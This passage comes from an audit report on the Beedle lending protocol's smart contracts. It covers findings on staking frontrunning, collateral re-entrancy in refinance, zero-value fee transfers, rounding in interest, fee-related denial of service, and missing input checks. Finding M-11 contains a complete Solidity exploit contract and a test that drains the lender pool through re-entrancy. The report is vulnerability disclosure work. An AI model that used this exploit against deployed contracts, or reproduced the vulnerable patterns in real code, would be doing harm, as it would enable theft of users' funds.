Corrupted or non-functional contracts when deployed on Arbitrum.

## Tools Used
Manual Review


## Recommendations
Lock or Constrain pragma as follows: pragma solidity 0.8.19 or pragma solidity >=0.8.0 <=0.8.19
## <a id='M-10'></a>M-10. Frontrun can get the full reward, no staking time required

_Submitted by [kutu](https://profiles.cyfrin.io/u/undefined), [bernd](https://profiles.cyfrin.io/u/undefined), [Bauer](https://profiles.cyfrin.io/u/undefined). Selected submission by: [kutu](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L61

## Summary

Anyone can get all the rewards as long as they call deposit before the reward distribution, without a long time staking, after receiving the reward, the user can withdraw the collateral and conduct other transactions. This would result in no user being willing to keep staking collateral.

## Vulnerability Details

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "solady/src/tokens/ERC20.sol";
import "../src/Staking.sol";

contract SERC20 is ERC20 {
    function name() public pure override returns (string memory) {
        return "Test ERC20";
    }

    function symbol() public pure override returns (string memory) {
        return "TERC20";
    }

    function mint(address _to, uint256 _amount) public {
        _mint(_to, _amount);
    }
}

contract StakingTest is Test {
    SERC20 st;
    SERC20 weth;
    Staking staking;

    function setUp() public {
        st = new SERC20();
        weth = new SERC20();
        staking  = new Staking(address(st), address(weth));
    }
    
    function testDeposit() public {
        address alice = makeAddr("Alice");
        address bob = makeAddr("Bob");

        deal(address(st), address(alice), 2 ether);
        deal(address(st), address(bob), 2 ether);

        vm.startPrank(bob);
        st.approve(address(staking), 2 ether);
        staking.deposit(2 ether);
        vm.stopPrank();

        vm.roll(100);

        vm.startPrank(alice);
        st.approve(address(staking), 2 ether);
        staking.deposit(2 ether);
        vm.stopPrank();

        deal(address(weth), address(staking), weth.balanceOf(address(staking)) + 1 ether);

        vm.startPrank(alice);
        staking.claim();
        vm.stopPrank();
        vm.startPrank(bob);
        staking.claim();
        vm.stopPrank();
        // @audit Although Bob staking 100 blocks, Alice only needed to frontrun to get the same reward
        assertEq(weth.balanceOf(alice), weth.balanceOf(bob));
    }
}
```

## Impact

Frontrun can get the full reward, which harms the interests of the staking users.

## Tools Used

Foundry

## Recommendations

Use time-weighted reward allocation algorithm.
## <a id='M-11'></a>M-11. Lender contract can be drained by re-entrancy in `refinance` (collateral)

_Submitted by [GoSoul22](https://profiles.cyfrin.io/u/undefined), [charlescheerful](https://profiles.cyfrin.io/u/undefined), [bernd](https://profiles.cyfrin.io/u/undefined), [lalanda](https://profiles.cyfrin.io/u/undefined), [Mlome](https://profiles.cyfrin.io/u/undefined), [sobieski](https://profiles.cyfrin.io/u/undefined), [qckhp](https://profiles.cyfrin.io/u/undefined), [superman_i4g](https://profiles.cyfrin.io/u/undefined), [HALITUS](https://profiles.cyfrin.io/u/undefined). Selected submission by: [Mlome](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L670


## Summary
Tokens allowing reentrant calls on transfer can be drained from a pool.

## Vulnerability Details
Some tokens allow reentrant calls on transfer (e.g. `ERC777` tokens).
Example of token with hook on transfer:
```solidity
pragma solidity ^0.8.19;

import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract WeirdToken is ERC20 {

    constructor(uint256 amount) ERC20("WeirdToken", "WT") {
        _mint(msg.sender, amount);
    }

    // Hook on token transfer
    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        if (to != address(0)) {
            (bool status,) = to.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
        }
    }
}
 ```
This kind of token allows a re-entrancy attack in the `refinance` function. When the new `collateral` is less than the current loan collateral, the difference is sent to the borrower before updating the state.
```solidity
File: Lender.Sol

L668:	} else if (collateral < loan.collateral) {
		// transfer the collateral tokens from the contract to the borrower
		IERC20(loan.collateralToken).transfer(
			msg.sender,
			loan.collateral - collateral
		); // @audit - Re-entrancy can drain contract
	}
```
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L670


## Impact
### POC
An attacker can use the following exploit contract to drain the `lender` contract:
```solidity
File: Exploit1.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {WeirdToken} from "./WeirdToken.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../utils/Structs.sol";
import "../Lender.sol";

contract Exploit1  {
    Lender lender;
    address loanToken;
    address collateralToken;
    Refinance refinance;

    constructor(Lender _lender, address _loanToken, address _collateralToken) {
        lender = _lender;
        loanToken = _loanToken;
        collateralToken = _collateralToken;
    }

    function attack(bytes32 _poolId, uint256 _debt, uint256 _collateral, uint256 _loanId, uint256 _newCollateral) external {
        // [1] Borrow a new loan
        ERC20(collateralToken).approve(address(lender), _collateral);
        Borrow memory b = Borrow({
            poolId: _poolId,
            debt: _debt,
            collateral: _collateral
        });
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;        
        lender.borrow(borrows);
        // [2] Refinance the loan with a lower amount of collateral
        refinance = Refinance({
            loanId: _loanId,
            poolId: _poolId,
            debt: _debt,
            collateral: _newCollateral
        });
        Refinance[] memory refinances = new Refinance[](1);
        refinances[0] = refinance;
        lender.refinance(refinances);
        // [3] Send the funds back to the attacker
        ERC20(loanToken).transfer(msg.sender, ERC20(loanToken).balanceOf(address(this)));
        ERC20(collateralToken).transfer(msg.sender, ERC20(collateralToken).balanceOf(address(this)));
    }

    function tokensReceived(address from, address /*to*/, uint256 /*amount*/) external {
        require(msg.sender == collateralToken, "not collateral token");
        if (from == address(lender)) {
            uint256 lenderBalance = ERC20(collateralToken).balanceOf(address(lender));
            if (lenderBalance > 0) {
                // Re-enter
                Refinance[] memory refinances = new Refinance[](1);
                if (lenderBalance >= amount) {
                    refinances[0] = refinance;
                } else {
                    Refinance memory r = refinance;
                    r.collateral += amount - lenderBalance;
                    refinances[0] = r;
                }
                lender.refinance(refinances);
            }          
        }
    }

}
```
Here are the tests that can be added to `Lender.t.sol` to illustrate the steps of an attacker:
```solidity
function test_exploit() public {
    address attacker = address(0x5);
    // Setup
    vm.startPrank(lender1);
    WeirdToken weirdToken = new WeirdToken(1_000_000*10**18);
    weirdToken.transfer(address(lender), 900_000*10**18); // Lender contract has 900_000 weirdToken
    weirdToken.transfer(address(attacker), 100_000*10**18); // Attacker has 100_000 weirdToken
    // lender1 creates a pool of loanTokens accepting weirdTokens as collateral
    Pool memory p = Pool({
        lender: lender1,
        loanToken: address(loanToken),
        collateralToken: address(weirdToken),
        minLoanSize: 10*10**18,
        poolBalance: 1000*10**18,
        maxLoanRatio: 2*10**18,
        auctionLength: 1 days,
        interestRate: 1000,
        outstandingLoans: 0
    });
    bytes32 poolId = lender.setPool(p);

    assertEq(weirdToken.balanceOf(address(lender)), 900_000*10**18);
    assertEq(loanToken.balanceOf(address(lender)), 1_000*10**18);
    assertEq(weirdToken.balanceOf(address(attacker)), 100_000*10**18);  // Attacker starts with some weirdTokens        
    assertEq(loanToken.balanceOf(address(attacker)), 0);

    // Exploit starts here
    vm.startPrank(attacker);
    Exploit1 attackContract = new Exploit1(lender, address(loanToken), address(weirdToken));
    weirdToken.transfer(address(attackContract), 100_000*10**18);
    uint256 debt = 10*10**18;
    uint256 collateral = 100_000*10**18;
    uint256 loanId = 0;
    uint256 newCollateral = 10*10**18;
    attackContract.attack(poolId, debt, collateral, loanId, newCollateral);

    // Pool has been drained
    assertEq(weirdToken.balanceOf(address(lender)), 0);
    assertLt(loanToken.balanceOf(address(lender)), 1_000*10**18);        // Pool has a debt
    assertEq(weirdToken.balanceOf(address(attacker)), 1_000_000*10**18); // Attacker has drained all the weirdTokens   
    assertGt(loanToken.balanceOf(address(attacker)), 0);                 // Attacker keeps the loan tokens
}
```

## Tools Used
Manual review + Foundry

## Recommendations
Follow the _Checks - Effect - Interactions_ (CEI) pattern by updating the loan variables before transfering the funds AND use nonReentrant modifiers
## <a id='M-12'></a>M-12. Some ERC20 tokens would revert on zero value fee transfers.

_Submitted by [daniel526](https://profiles.cyfrin.io/u/undefined), [peanuts](https://profiles.cyfrin.io/u/undefined), [qbs](https://profiles.cyfrin.io/u/undefined), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined), [pep7siup](https://profiles.cyfrin.io/u/undefined), [bernd](https://profiles.cyfrin.io/u/undefined), [xfu](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [SA110](https://profiles.cyfrin.io/u/undefined), [UrosZigic](https://profiles.cyfrin.io/u/undefined), [JMTT](https://profiles.cyfrin.io/u/undefined), [0xackermann](https://profiles.cyfrin.io/u/undefined), [ni8mare](https://profiles.cyfrin.io/u/undefined). Selected submission by: [ni8mare](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L292

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L720

## Summary
Functions like `repay` would fail if the fees calculated using `_calculateInterest` within these functions return a 0 value. 

## Vulnerability Details
Note that the protocol does not limit what type of tokens will be used. As anyone can create a pool with any ERC20 token.
Some tokens like LEND revert on zero-value fee [transfers](https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers). So, if fees generated within `_calculateInterest` is 0, then the following would revert for tokens like LEND:

```solidity
IERC20(loan.loanToken).transferFrom(
  msg.sender,
  feeReceiver,
  protocolInterest 
);
```

where `protocolInterest` is the following: 

```solidity
(
  uint256 lenderInterest,
  uint256 protocolInterest
) = _calculateInterest(loan);
```
It is generated from the `_calculateInterest`. Since the transfer is done within the repay function, the `repay` function would revert.

The following POC was tested using Fuzz-testing.

```solidity
    function testFuzzZeroFees(uint256 debt, uint256 time, uint256 rate) public {
        //Note - this lower bound for interest rate is possible,
        //cause the setPool function only checks for the upper bound.
        rate = bound(rate, 10, 100000);

        time = bound(time, 100, 30 days); //the lower bound could be even lower for time.

        //Note - the lower bound could be even lower. Depends on the minLoanSize of the pool.
        //Theoretically, even lower bounds are possible.
        debt = bound(debt, 10 ** 8, 10 ** 18);

        uint256 feePercent = 1000; //lenderFee percent

        //Note - this is a simplified version of _calculateInterest function.
        uint256 interest = (rate * debt * time) / 10000 / 365 days;
        uint256 fees1 = (interest * feePercent) / 10000;

        console.log("rate: ", rate);
        console.log("feePercent: ", feePercent);
        console.log("debt: ", debt);
        console.log("time: ", time);
        console.log("fees1: ", fees1);

        //Note - the following assertion fails.
        assertTrue(fees1 != 0);
    }
```

The assertion always failed. The console logs:

```
  Logs:
  Bound Result 10
  Bound Result 100
  Bound Result 100000000
  rate:  10
  feePercent:  1000
  debt:  100000000
  time:  100
  fees1:  0
  Error: Assertion Failed
```

## Impact
If the fee returned is 0, then a function like repay would fail when they try to send a 0 value token transfer, for tokens like LEND.

## Tools Used
Fuzz-testing, manual review

## Recommendations
Ensure the following:

```solidity
if(protocolInterest > 0) {
  IERC20(loan.loanToken).transferFrom(
    msg.sender,
    feeReceiver,
    protocolInterest 
  );
}
```

## <a id='M-13'></a>M-13. Rounding error leads to borrowing loans without paying interest

_Submitted by [0xscsamurai](https://profiles.cyfrin.io/u/undefined), [vangrim](https://profiles.cyfrin.io/u/undefined), [0xdeth](https://profiles.cyfrin.io/u/undefined), [serialcoder](https://profiles.cyfrin.io/u/undefined), [TorpedopistolIxc41](https://profiles.cyfrin.io/u/undefined), [KrisApostolov](https://profiles.cyfrin.io/u/undefined). Selected submission by: [serialcoder](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L724

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L725

## Summary

There is a rounding error when calculating the `interest` and `fees` in the `Lender::_calculateInterest()` if the loan token (debt) has too small decimals. As a result, a borrower (or attacker) can borrow loans without paying interest. 

## Vulnerability Details

The `_calculateInterest()` calculates the [`interest`](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L724) (`lenderInterest`) and [`fees`](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L725) (`protocolInterest`) that a borrower has to pay for their loan. However, the formulas for calculating the `interest` and `fees` do not support the case that the loan token (debt) has too small decimals, leading to a rounding error.

```solidity
    function _calculateInterest(
        Loan memory l
    ) internal view returns (uint256 interest, uint256 fees) {
        uint256 timeElapsed = block.timestamp - l.startTimestamp;
@>      interest = (l.interestRate * l.debt * timeElapsed) / 10000 / 365 days;
@>      fees = (lenderFee * interest) / 10000;
        interest -= fees;
    }
```

- `interest` (`lenderInterest`): https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L724

- `fees` (`protocolInterest`): https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L725

### Proof of Concept

Consider the [GUSD (Gemini dollar) token](https://etherscan.io/token/0x056fd409e1d7a124bd7017459dfea2f387b6d5cd), which has *2 decimals*.
- `l.debt`: 100 GUSD
- `l.interestRate`: 100 (1%) per year
- `timeElapsed`: 86400 seconds (1 day)
- `lenderFee`: 100 (1%)

```solidity
interest = (l.interestRate * l.debt * timeElapsed) / 10000 / 365 days
		 = (100 * (100 * 1e2) * 86400) / 10000 / 31536000
		 = 8640 / 31536
		 = 0 (rounding down; since Solidity has no fixed-point numbers)

fees = (lenderFee * interest) / 10000
     = (100 * 0) / 10000
     = 0
```

As you can see, the resulting `interest` and `fees` will become 0 due to the rounding down since Solidity has no fixed-point numbers. Consequently, a borrower does not need to pay the lender interest or protocol interest.

## Impact

As explained in the `Proof of Concept` section, a borrower does not need to pay the lender interest or protocol interest if the loan token (debt) has too small decimals (e.g., [GUSD (Gemini dollar)](https://etherscan.io/token/0x056fd409e1d7a124bd7017459dfea2f387b6d5cd) has *2 decimals*).

An attacker can leverage this vulnerability by borrowing a lot of *short-term loan positions with a small debt*. In this way, the attacker can borrow a bigger debt without paying interest.

## Tools Used

Manual Review

## Recommendations

I recommend verifying that the loan token (`p.loanToken`) must have sufficient decimals when creating a pool, as shown below. Please set the `MIN_LOAN_TOKEN_DECIMALS` constant with an appropriate value.

```diff
+   uint8 public constant MIN_LOAN_TOKEN_DECIMALS = 3; //@audit -- set with an appropriate value

    ...

    function setPool(Pool calldata p) public returns (bytes32 poolId) {
        // validate the pool
        if (
            p.lender != msg.sender ||
            p.minLoanSize == 0 ||
            p.maxLoanRatio == 0 ||
            p.auctionLength == 0 ||
            p.auctionLength > MAX_AUCTION_LENGTH ||
            p.interestRate > MAX_INTEREST_RATE
        ) revert PoolConfig();

+       if (IERC20Metadata(p.loanToken).decimals() < MIN_LOAN_TOKEN_DECIMALS)
+           revert PoolConfig();

        // check if they already have a pool balance
        poolId = getPoolId(p.lender, p.loanToken, p.collateralToken);

        ...
    }
```
## <a id='M-14'></a>M-14. Setting borrower fees to 0 permits the borrow functionality to be completely DoS

_Submitted by [abarbatei](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L720-L727

## Summary

If the protocol decides for whatever reason to set the protocol borrowing fee to 0 (example to encourage users to use the protocol), then a malicious actor can DoS all borrow operations by:
1. front-running any loan operation, fully borrowing all available pool tokens
2. normal user transaction would revert as there are no more tokens to borrow in the pool
3. malicious actor would also back-run the repaying of all his debt to the pool

By doing this, borrowing from any pool can be blocked. Also, the cost required to perform this attack is very low (no interest/fee to be paid, only gas cost required) and the attack results in the DoS of one of the most crucial feature of the protocol, i.e. borrow.

## Vulnerability Details

When initiation a borrow, [a borrower fee is deducted](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L264-L267) from the overall debt to be encored and sent to the protocol.

```Solidity
    // calculate the fees
    uint256 fees = (debt * borrowerFee) / 10000;
    // transfer fees
    IERC20(loan.loanToken).transfer(feeReceiver, fees);
```

Also, when repaying a debt, the [a lender fee is paid plus an extra interest to the pool](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L316-L327):

```Solidity
    // transfer the loan tokens from the borrower to the pool
    IERC20(loan.loanToken).transferFrom(
        msg.sender,
        address(this),
        loan.debt + lenderInterest
    );
    // transfer the protocol fee to the fee receiver
    IERC20(loan.loanToken).transferFrom(
        msg.sender,
        feeReceiver,
        protocolInterest
    );
```

where the value for `lenderInterest` and `protocolInterest` is [calculate](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L296-L301) using the [`_calculateInterest` function](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L720-L727) as such:

```Solidity
    function _calculateInterest(
        Loan memory l
    ) internal view returns (uint256 interest, uint256 fees) {
        uint256 timeElapsed = block.timestamp - l.startTimestamp;
        interest = (l.interestRate * l.debt * timeElapsed) / 10000 / 365 days;
        fees = (lenderFee * interest) / 10000;
        interest -= fees;
    }
```

From the above implementations we see that:
- borrowing fees are 0 if the variable `borrowerFee` is 0 
    
    ```
    fees = (debt * borrowerFee) / 10000;
         = (debt * 0) / 10000;
         = 0; 
   ```

- if done in the same transaction, when repaying, fees are calculated based on `timeElapsed` which is 0 resulting in both `lenderInterest` and `protocolInterest` being 0:
 
    ```
            uint256 timeElapsed = block.timestamp - l.startTimestamp;
                                = block.timestamp - block.timestamp
                                = 0
            
            interest = (l.interestRate * l.debt * timeElapsed) / 10000 / 365 days;
                     = (l.interestRate * l.debt * 0) / 10000 / 365 days;
                     = 0;

            fees = (lenderFee * interest) / 10000;
                 = (lenderFee * 0) / 10000;
                 = 0;
    ```

as such, no fees are deducted in a complete borrow + repay cycle. 

This behavior can be abused in the following way, a theoretical POC:
- `eve` (protocol owner) just launched the protocol and wants to encourage adoption so he drops the `borrowerFee` to 0
- `alice` wants to borrow using the protocol so she initiates a transaction
- `bob`, who wants `eve`'s project to fail, front-runs `alice`'s borrow with his own and [borrows all available pool balance](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L268-L269)
- `alice`'s borrow will now revert due to an [underflow on updating pool balance](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L261-L263) (because there is no more available balance to be used)
- `bob` also launched a back-run call that repays his loan completely

## Impact

Protocol borrow operation is completely blocked under certain conditions.

## Tools Used 

Manual analysis and similar issues in other audits.

## Recommend Mitigation

Modify the `_calculateInterest` to attribute a default protocol fee as to make this attack economically unsustainable.

The simplest alternative is to not allow the setting of borrower fees to 0. However this brings some limitations, as protocol may want to weaver any fees at one point but could not because of this situation.



## <a id='M-15'></a>M-15. The lack of a WETH-Profits Token pair upon calling sellProfits can expose it to malicious pool creation

_Submitted by [KrisApostolov](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol#L26-L44

## Summary

Some tokens do not have Uniswap V3 pools with WETH, which allows a bad actor to frontrun the transaction and create a pool with an offset liquidity ratio and subsequently steal the funds.

## Vulnerability Details

When calling `sellProfits` the function calls `exactInputSingle` on the Uniswap V3 `SwapRouter` with a token pair of WETH and the profits token address from calldata. In the case of a token pair between the two not existing the call will revert. This absence of such a pool can be used maliciously by a bad actor to frontrun the call and create a pool with an offset price so they can extract the tokens.

## Impact

The tokens will be mostly lost due to the bad exchange rate. This will occur very rarely due to most tokens already having Uniswap v3 pairs with WETH, hence the medium severity.

## Tools Used

Manual Review

## Recommendations

Consider using `swapExactInputMultihop` with a path that is first swapping the less popular token into some other token with higher liquidity like USDC. It will be better for the specific case of the contract due to the arbitrary nature of the tokens it will be working with.

# Low Risk Findings

## <a id='L-01'></a>L-01. Zero address leads to transaction reverts

_Submitted by [B353N](https://profiles.cyfrin.io/u/undefined), [LaScaloneta](https://codehawks.cyfrin.io/team/clkgxjy6h0025lc080s97ux79), [castleChain](https://profiles.cyfrin.io/u/undefined), [0xbug](https://profiles.cyfrin.io/u/undefined), [Bughunter101](https://profiles.cyfrin.io/u/undefined), [ptsanev](https://profiles.cyfrin.io/u/undefined), [0xNiloy](https://profiles.cyfrin.io/u/undefined), [kamuik16](https://profiles.cyfrin.io/u/undefined), [leasowillow](https://profiles.cyfrin.io/u/undefined), [gaxnik1](https://profiles.cyfrin.io/u/undefined), [0x9527](https://profiles.cyfrin.io/u/undefined), [StErMi](https://profiles.cyfrin.io/u/undefined), [ZdravkoHr](https://profiles.cyfrin.io/u/undefined), [nisedo](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [pxng0lin](https://profiles.cyfrin.io/u/undefined), [larsson](https://profiles.cyfrin.io/u/undefined), [0xstuart](https://profiles.cyfrin.io/u/undefined), [bauchibred](https://profiles.cyfrin.io/u/undefined), [JrNet](https://profiles.cyfrin.io/u/undefined), [codeslide](https://profiles.cyfrin.io/u/undefined), [Shogoki](https://profiles.cyfrin.io/u/undefined), [alliums0517](https://profiles.cyfrin.io/u/undefined), [ravikiranweb3](https://profiles.cyfrin.io/u/undefined), [stoicov](https://profiles.cyfrin.io/u/undefined), [alymurtazamemon](https://profiles.cyfrin.io/u/undefined), [ke1cam](https://profiles.cyfrin.io/u/undefined), [nervouspika](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [kral01](https://profiles.cyfrin.io/u/undefined), [bloqarl](https://profiles.cyfrin.io/u/undefined), [timenov](https://profiles.cyfrin.io/u/undefined), [bube](https://profiles.cyfrin.io/u/undefined), [samshz](https://profiles.cyfrin.io/u/undefined), [0xscsamurai](https://profiles.cyfrin.io/u/undefined), [xfu](https://profiles.cyfrin.io/u/undefined), [zuhaibmohd](https://profiles.cyfrin.io/u/undefined), [0xlemon](https://profiles.cyfrin.io/u/undefined), [y51r](https://profiles.cyfrin.io/u/undefined), [aamirusmani1552](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [topmark](https://profiles.cyfrin.io/u/undefined), [bbash](https://profiles.cyfrin.io/u/undefined), [neocrao](https://profiles.cyfrin.io/u/undefined), [SolSaver](https://profiles.cyfrin.io/u/undefined), [alexzoid](https://profiles.cyfrin.io/u/undefined), [blockchainbard](https://profiles.cyfrin.io/u/undefined), [0xsandy](https://profiles.cyfrin.io/u/undefined), [0xPublicGoods](https://profiles.cyfrin.io/u/undefined), [sma4](https://profiles.cyfrin.io/u/undefined), [serialcoder](https://profiles.cyfrin.io/u/undefined), [ohi0b](https://profiles.cyfrin.io/u/undefined), [0xrochimaru](https://profiles.cyfrin.io/u/undefined), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro), [crypt0mate](https://profiles.cyfrin.io/u/undefined), [fondevs](https://profiles.cyfrin.io/u/undefined), [maroutis](https://profiles.cyfrin.io/u/undefined). Selected submission by: [serialcoder](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L101

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L267

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L325

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L403

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L505

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L563

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L651

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L656

## Summary

The `Lender::setFeeReceiver()` lacks checking the `address(0)`, leading to transaction reverts on the `borrow()`, `repay()`, `giveLoan()`, `buyLoan()`, `seizeLoan()`, and `refinance()`.

## Vulnerability Details

The `feeReceiver` variable can be set by an admin through the `setFeeReceiver()`. The function does not check if the `address(0)` is inputted, though. 

```solidity
    function setFeeReceiver(address _feeReceiver) external onlyOwner {
@>      feeReceiver = _feeReceiver;
    }
```

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L101

## Impact

If the `address(0)` is inputted by mistake, the following functions will revert transactions.
- `borrow()` in [L267](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L267)
- `repay()` in [L325](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L325)
- `giveLoan()` in [L403](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L403)
- `buyLoan()` in [L505](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L505)
- `seizeLoan()` in [L563](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L563)
- `refinance()` in [L651](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L651) and [L656](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L656)

## Tools Used

Manual Review

## Recommendations

I recommend reverting a transaction if the `address(0)` is inputted to the `setFeeReceiver()`.

```diff
    function setFeeReceiver(address _feeReceiver) external onlyOwner {
+       if (_feeReceiver == address(0)) revert ZeroAddress();
        feeReceiver = _feeReceiver;
    }
```
## <a id='L-02'></a>L-02. Lender fails to giveLoan because of inconsistent length between `loadIds` and `poolIds`

_Submitted by [bero42](https://profiles.cyfrin.io/u/undefined), [castleChain](https://profiles.cyfrin.io/u/undefined), [LaScaloneta](https://codehawks.cyfrin.io/team/clkgxjy6h0025lc080s97ux79), [ptsanev](https://profiles.cyfrin.io/u/undefined), [patrooney](https://profiles.cyfrin.io/u/undefined), [Phantasmagoria](https://profiles.cyfrin.io/u/undefined), [bauchibred](https://profiles.cyfrin.io/u/undefined), [leasowillow](https://profiles.cyfrin.io/u/undefined), [EchoSpr](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [B353N](https://profiles.cyfrin.io/u/undefined), [0xrststn](https://profiles.cyfrin.io/u/undefined), [timenov](https://profiles.cyfrin.io/u/undefined), [amar](https://profiles.cyfrin.io/u/undefined), [stoicov](https://profiles.cyfrin.io/u/undefined), [sonny2k](https://profiles.cyfrin.io/u/undefined), [xfu](https://profiles.cyfrin.io/u/undefined), [touqeershah32](https://profiles.cyfrin.io/u/undefined), [neocrao](https://profiles.cyfrin.io/u/undefined), [SolSaver](https://profiles.cyfrin.io/u/undefined), [aamirusmani1552](https://profiles.cyfrin.io/u/undefined), [0xsandy](https://profiles.cyfrin.io/u/undefined), [0xrochimaru](https://profiles.cyfrin.io/u/undefined), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro), [ubermensch](https://profiles.cyfrin.io/u/undefined), [0xackermann](https://profiles.cyfrin.io/u/undefined), [maroutis](https://profiles.cyfrin.io/u/undefined), [0xdice91](https://profiles.cyfrin.io/u/undefined), [lian886](https://profiles.cyfrin.io/u/undefined), [gaslimit](https://profiles.cyfrin.io/u/undefined), [turvec](https://profiles.cyfrin.io/u/undefined). Selected submission by: [0xackermann](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L351-L432

## Vulnerability Details

### Impact

Lender fails to giveLoan because of inconsistent length between `loadIds` and `poolIds`, which wastes the gas fees of the Lender.

### **Proof of concept**

```solidity
function giveLoan(
    uint256[] calldata loanIds,
    bytes32[] calldata poolIds
) external {
    for (uint256 i = 0; i < loanIds.length; i++) {
        uint256 loanId = loanIds[i];
        bytes32 poolId = poolIds[i];
        ...
    }
}
```

Here is the `giveLoan` function which does not check if the `loanIds` and `poolIds` have the same length. For example, the lender mistakenly leaves out one of the `poolIds` which means the last `loanId` does not map to any `poolId` since `loanIds.length = poolIds.length + 1`. Hence, since there is an out-of-bounds error when getting the pool id, `poolId = poolIds[i]`, the entire function will revert due to this error. 

```solidity
// Lender.t.sol
function test_giveLoanDifferentLength() public {
    test_borrow();

    vm.startPrank(lender2);
    Pool memory p = Pool({
        lender: lender2,
        loanToken: address(loanToken),
        collateralToken: address(collateralToken),
        minLoanSize: 100 * 10 ** 18,
        poolBalance: 1000 * 10 ** 18,
        maxLoanRatio: 2 * 10 ** 18,
        auctionLength: 1 days,
        interestRate: 1000,
        outstandingLoans: 0
    });
    lender.setPool(p);

    uint256[] memory loanIds = new uint256[](1);
    loanIds[0] = 0;
    // different length
    bytes32[] memory poolIds = new bytes32[](0);

    vm.startPrank(lender1);
    lender.giveLoan(loanIds, poolIds);
